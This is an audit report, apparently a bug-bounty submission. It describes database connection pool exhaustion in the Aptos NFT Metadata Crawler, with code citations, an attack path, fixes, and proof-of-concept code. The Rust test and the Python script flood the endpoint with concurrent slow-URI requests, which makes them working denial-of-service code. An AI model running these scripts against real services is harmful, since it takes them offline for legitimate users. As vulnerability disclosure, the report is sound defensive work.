# Audit Report

## Title
Database Connection Pool Exhaustion in NFT Metadata Crawler Service

## Summary
The NFT Metadata Crawler service does not properly configure database connection pool limits, using only the default 10 connections from r2d2. Combined with long-lived connection usage during I/O-intensive parsing operations and publicly accessible unauthenticated endpoints, an attacker can trivially exhaust all database connections by sending a small number of concurrent requests, causing service-wide unavailability.

## Finding Description

The `NFTMetadataCrawlerConfig` loads and establishes a database connection pool without proper size limits. [1](#0-0) 

This pool is created using the default r2d2 configuration with no explicit `max_size` parameter: [2](#0-1) 

The default r2d2 pool size is only **10 connections**. This severely undersized pool becomes exploitable due to several factors:

**1. Long-lived Connection Usage**: The Parser service acquires a database connection and holds it for the entire duration of parsing operations, which include multiple slow I/O operations: [3](#0-2) 

The connection is then passed to a Worker and held throughout the parse operation: [4](#0-3) 

**2. I/O-Intensive Operations**: Each parsing operation can take 30-90+ seconds due to network timeouts and retries: [5](#0-4) 

**3. Public Exposure Without Authentication**: The service binds to all network interfaces without any authentication middleware: [6](#0-5) 

**Attack Path:**
1. Attacker identifies the NFT metadata crawler service endpoint
2. Attacker sends 10 concurrent POST requests to the Parser endpoint (`/`) with payloads containing extremely slow URIs (e.g., URIs pointing to intentionally slow servers that take the full timeout duration)
3. Each request acquires a database connection via `pool.get()` 
4. Connections remain held for 30-90+ seconds during JSON parsing, image optimization, and GCS uploads
5. All 10 connections in the pool are now exhausted
6. Any subsequent legitimate requests or internal database operations fail with "unable to get connection" errors
7. Service becomes unavailable until connections are released or service is restarted

## Impact Explanation

This vulnerability qualifies as **Medium severity** under the Aptos bug bounty criteria for the following reasons:

- **State Inconsistencies Requiring Intervention**: When the connection pool is exhausted, the NFT metadata crawler cannot process new NFT metadata, query existing data, or serve status requests. The database state becomes inconsistent with the blockchain state as new NFT transactions cannot be indexed. Service operators must manually restart the service to recover.

- **API Crashes**: The service's HTTP endpoints become unresponsive, effectively crashing the API. [7](#0-6) 

The vulnerability does NOT qualify as Critical or High because:
- It does not affect consensus, validator operations, or the core blockchain
- No funds are at risk (this is an indexer service, not a financial system)
- It only impacts the NFT metadata indexing service, not the entire network

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivial to execute:
- No authentication required
- No special privileges needed
- Simple HTTP client can perform the attack
- Only 10 concurrent requests needed to fully exhaust the pool
- Attack can be sustained with minimal resources
- Server is publicly accessible on `0.0.0.0`

The vulnerability will be triggered if:
- Service is deployed with default configuration (highly likely)
- Attacker has network access to the service port
- Attacker sends 10+ concurrent requests with slow URIs

## Recommendation

Implement proper connection pool configuration with explicit limits:

**Fix in `ecosystem/nft-metadata-crawler/src/config.rs`:**
Add connection pool configuration parameters to `NFTMetadataCrawlerConfig`:
```rust
pub struct NFTMetadataCrawlerConfig {
    pub database_url: String,
    pub server_port: u16,
    pub server_config: ServerConfig,
    pub db_pool_size: u32,  // Add this field
}
```

**Fix in `ecosystem/nft-metadata-crawler/src/utils/database.rs`:**
```rust
pub fn establish_connection_pool(
    database_url: &str,
    max_size: u32,
) -> Pool<ConnectionManager<PgConnection>> {
    let manager = ConnectionManager::<PgConnection>::new(database_url);
    Pool::builder()
        .max_size(max_size)
        .connection_timeout(Duration::from_secs(10))
        .build(manager)
        .expect("Failed to create pool.")
}
```

**Recommended Values:**
- Set `max_size` to at least 50-100 connections for production deployments
- Add connection timeout to prevent indefinite waiting
- Implement request-level timeouts to release connections faster

**Additional Mitigations:**
1. Add authentication middleware to all HTTP endpoints
2. Implement rate limiting per client IP
3. Add request timeout at the axum layer
4. Consider releasing database connections earlier in the Worker by restructuring to only hold connections during actual database operations, not during I/O

## Proof of Concept

**Rust test demonstrating connection pool exhaustion:**

```rust
#[tokio::test]
async fn test_connection_pool_exhaustion() {
    use reqwest::Client;
    use std::sync::Arc;
    use tokio::time::Duration;
    
    // Assuming the service is running on localhost:8080
    let client = Arc::new(Client::new());
    let endpoint = "http://localhost:8080/";
    
    // Create 11 concurrent requests (more than the pool size of 10)
    let mut handles = vec![];
    
    for i in 0..11 {
        let client_clone = client.clone();
        let handle = tokio::spawn(async move {
            // Send malicious payload with slow URI
            let payload = format!(
                "asset_data_id,http://intentionally-slow-server.example.com/metadata/{}.json,1000,2024-01-01 00:00:00 UTC,1,false",
                i
            );
            
            let response = client_clone
                .post(endpoint)
                .body(payload)
                .timeout(Duration::from_secs(120))
                .send()
                .await;
                
            println!("Request {} status: {:?}", i, response);
            response
        });
        handles.push(handle);
    }
    
    // First 10 requests should succeed (or be in progress)
    // The 11th request should fail due to connection pool exhaustion
    let results = futures::future::join_all(handles).await;
    
    let mut success_count = 0;
    let mut failure_count = 0;
    
    for (i, result) in results.iter().enumerate() {
        match result {
            Ok(Ok(_)) => success_count += 1,
            Ok(Err(e)) => {
                println!("Request {} failed with error: {}", i, e);
                failure_count += 1;
            },
            Err(e) => {
                println!("Request {} panicked: {}", i, e);
                failure_count += 1;
            }
        }
    }
    
    println!("Success: {}, Failures: {}", success_count, failure_count);
    assert!(failure_count > 0, "Expected at least one request to fail due to pool exhaustion");
}
```

**Simple attack script (Python):**
```python
import requests
import threading

def send_malicious_request(id):
    payload = f"asset,http://10.255.255.1/slow.json,{id},2024-01-01 00:00:00 UTC,1,false"
    try:
        response = requests.post(
            "http://target-nft-crawler:8080/",
            data=payload,
            timeout=120
        )
        print(f"Request {id}: {response.status_code}")
    except Exception as e:
        print(f"Request {id} failed: {e}")

# Launch 15 concurrent requests to exhaust the 10-connection pool
threads = []
for i in range(15):
    t = threading.Thread(target=send_malicious_request, args=(i,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
```

## Notes

This vulnerability specifically affects the NFT Metadata Crawler indexer service, which is part of the Aptos ecosystem infrastructure for indexing NFT metadata. While it does not directly impact consensus or the core blockchain, it represents a critical operational issue for NFT-related applications built on Aptos that depend on this indexing service for metadata availability.

The issue is compounded by the fact that similar indexer services in the codebase may suffer from the same misconfiguration pattern, as evidenced by the similar implementation in the general indexer: [8](#0-7)

### Citations

**File:** ecosystem/nft-metadata-crawler/src/config.rs (L90-92)
```rust
        info!("[NFT Metadata Crawler] Connecting to database");
        let pool = establish_connection_pool(&self.database_url);
        info!("[NFT Metadata Crawler] Database connection successful");
```

**File:** ecosystem/nft-metadata-crawler/src/config.rs (L100-101)
```rust
        let listener = TcpListener::bind(format!("0.0.0.0:{}", self.server_port)).await?;
        axum::serve(listener, context.build_router()).await?;
```

**File:** ecosystem/nft-metadata-crawler/src/utils/database.rs (L20-25)
```rust
pub fn establish_connection_pool(database_url: &str) -> Pool<ConnectionManager<PgConnection>> {
    let manager = ConnectionManager::<PgConnection>::new(database_url);
    Pool::builder()
        .build(manager)
        .expect("Failed to create pool.")
}
```

**File:** ecosystem/nft-metadata-crawler/src/parser/mod.rs (L110-117)
```rust
        let mut conn = self.pool.get().unwrap_or_else(|e| {
            error!(
                pubsub_message = pubsub_message,
                error = ?e,
                "[NFT Metadata Crawler] Failed to get DB connection from pool");
            UNABLE_TO_GET_CONNECTION_COUNT.inc();
            panic!();
        });
```

**File:** ecosystem/nft-metadata-crawler/src/parser/worker.rs (L32-44)
```rust
pub struct Worker {
    parser_config: Arc<ParserConfig>,
    conn: PooledConnection<ConnectionManager<PgConnection>>,
    max_num_retries: i32,
    gcs_client: Arc<GCSClient>,
    pubsub_message: String,
    model: ParsedAssetUris,
    asset_data_id: String,
    asset_uri: String,
    last_transaction_version: i64,
    last_transaction_timestamp: chrono::NaiveDateTime,
    force: bool,
}
```

**File:** ecosystem/nft-metadata-crawler/src/utils/constants.rs (L10-14)
```rust
/// Allocate 30 seconds for downloading large JSON files
pub const MAX_JSON_REQUEST_RETRY_SECONDS: u64 = 30;

/// Allocate 90 seconds for downloading large image files
pub const MAX_IMAGE_REQUEST_RETRY_SECONDS: u64 = 90;
```

**File:** ecosystem/nft-metadata-crawler/src/asset_uploader/api/mod.rs (L138-149)
```rust
impl Server for AssetUploaderApiContext {
    fn build_router(&self) -> axum::Router {
        let self_arc = Arc::new(self.clone());
        axum::Router::new()
            .route("/upload", post(Self::handle_upload_batch))
            .route(
                "/status/:application_id/:idempotency_key",
                get(Self::handle_get_status),
            )
            .layer(Extension(self_arc.clone()))
    }
}
```

**File:** crates/indexer/src/database.rs (L59-62)
```rust
pub fn new_db_pool(database_url: &str) -> Result<PgDbPool, PoolError> {
    let manager = ConnectionManager::<PgConnection>::new(database_url);
    PgPool::builder().build(manager).map(Arc::new)
}
```
